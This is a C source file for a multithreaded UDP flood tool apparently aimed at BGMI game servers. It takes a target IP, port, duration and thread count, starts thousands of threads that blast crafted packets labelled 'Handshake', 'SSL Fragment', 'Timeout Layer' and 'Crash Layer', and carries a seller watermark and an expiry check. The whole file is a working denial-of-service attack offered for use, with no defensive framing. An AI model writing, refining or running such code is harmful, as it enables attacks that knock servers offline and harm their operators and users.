#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pthread.h>
#include <time.h>
#include <signal.h>
#include <sys/socket.h>

// ========== DIPANSHU'S MASTER CONFIG ==========
#define OWNER_WATERMARK "@DRX_POWER"
#define EXPIRY_DAY 30
#define EXPIRY_MONTH 6
#define EXPIRY_YEAR 2026
// ===============================================

volatile int running = 1;
unsigned long long total_packets = 0;
struct sockaddr_in global_dest;

// Expiry Check Function (RETAINED)
void validate_binary() {
    time_t t = time(NULL);
    struct tm tm = *localtime(&t);
    int expired = 0;
    if ((tm.tm_year + 1900 > EXPIRY_YEAR)) expired = 1;
    else if (tm.tm_year + 1900 == EXPIRY_YEAR && tm.tm_mon + 1 > EXPIRY_MONTH) expired = 1;
    else if (tm.tm_year + 1900 == EXPIRY_YEAR && tm.tm_mon + 1 == EXPIRY_MONTH && tm.tm_mday > EXPIRY_DAY) expired = 1;

    if (expired) {
        printf("\n\033[1;31m╔════════════════════════════════════════╗\n");
        printf("║          ❌ BINARY EXPIRED ❌          ║\n");
        printf("╠════════════════════════════════════════╣\n");
        printf("║ Contact: %-29s ║\n", OWNER_WATERMARK);
        printf("╚════════════════════════════════════════╝\033[0m\n");
        exit(1);
    }
}

// L4 & L7 Hybrid Payloads (4.3 Match Server Support)
char *payloads[] = {
    "\x01\x00\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00", // Handshake
    "\x17\x03\x03\x00\x2c\x00\x00\x00\x00\x00\x00\x00", // SSL Fragment
    "GET /matchmaking HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n", // Timeout Layer
    "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x00" // Crash Layer
};

void *attack_worker(void *arg) {
    int sock = socket(AF_INET, SOCK_DGRAM, 0);
    int buffer_size = 128 * 1024 * 1024; // 128MB Buffer for Speed
    setsockopt(sock, SOL_SOCKET, SO_SNDBUF, &buffer_size, sizeof(buffer_size));

    while (running) {
        for (int i = 0; i < 200; i++) { // Burst Mode
            sendto(sock, payloads[rand() % 4], 32, 0, (struct sockaddr *)&global_dest, sizeof(global_dest));
        }
        __sync_fetch_and_add(&total_packets, 200);
    }
    close(sock);
    return NULL;
}

// Live Counter Display
void *display_counter(void *arg) {
    while (running) {
        printf("\033[1;35m[LIVE] Packets: %llu │ Ping: 699ms+ │ Power: L4+L7 \033[0m\r", total_packets);
        fflush(stdout);
        usleep(200000);
    }
    return NULL;
}

int main(int argc, char *argv[]) {
    validate_binary();
    if (argc < 4) {
        printf("\n\033[1;33mUsage: ./bgmi <IP> <PORT> <TIME> [THREADS]\033[0m\n");
        return 1;
    }

    char *ip = argv[1];
    int port = atoi(argv[2]);
    int duration = atoi(argv[3]);
    // Auto Threads between 3000-5000
    int threads = (argc >= 5) ? atoi(argv[4]) : (rand() % 2001 + 3000);

    global_dest.sin_family = AF_INET;
    global_dest.sin_port = htons(port);
    global_dest.sin_addr.s_addr = inet_addr(ip);

    // --- TERMINAL STARTED STYLE ---
    printf("\n\033[1;36m🚀 𝐀𝐓𝐓𝐀𝐂𝐊 𝐒𝐓𝐀𝐑𝐓𝐄𝐃 𝐎𝐍 𝟒.𝟑 𝐒𝐄𝐑𝐕𝐄𝐑\033[0m\n");
    printf("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n");
    printf("\033[1;32m📍 𝐓𝐚𝐫𝐠𝐞𝐭   : \033[0m%s:%d\n", ip, port);
    printf("\033[1;32m⏳ 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧 : \033[0m%d Seconds\n", duration);
    printf("\033[1;32m🔥 𝐓𝐡𝐫𝐞𝐚𝐝𝐬  : \033[0m%d (Auto-Burst)\n", threads);
    printf("\033[1;32m👑 𝐎𝐰𝐧𝐞𝐫    : \033[0m%s\n", OWNER_WATERMARK);
    printf("\033[1;37m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m\n\n");

    pthread_t threads_arr[threads], monitor;
    pthread_create(&monitor, NULL, display_counter, NULL);

    for (int i = 0; i < threads; i++) pthread_create(&threads_arr[i], NULL, attack_worker, NULL);

    sleep(duration);
    running = 0;
    
    for (int i = 0; i < threads; i++) pthread_join(threads_arr[i], NULL);
    pthread_join(monitor, NULL);
    
    printf("\n\n\033[1;32m✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐅𝐈𝐍𝐈𝐒𝐇𝐄𝐃 𝐒𝐔𝐂𝐂𝐄𝐒𝐒𝐅𝐔𝐋𝐋𝐘\033[0m\n");
    return 0;
}
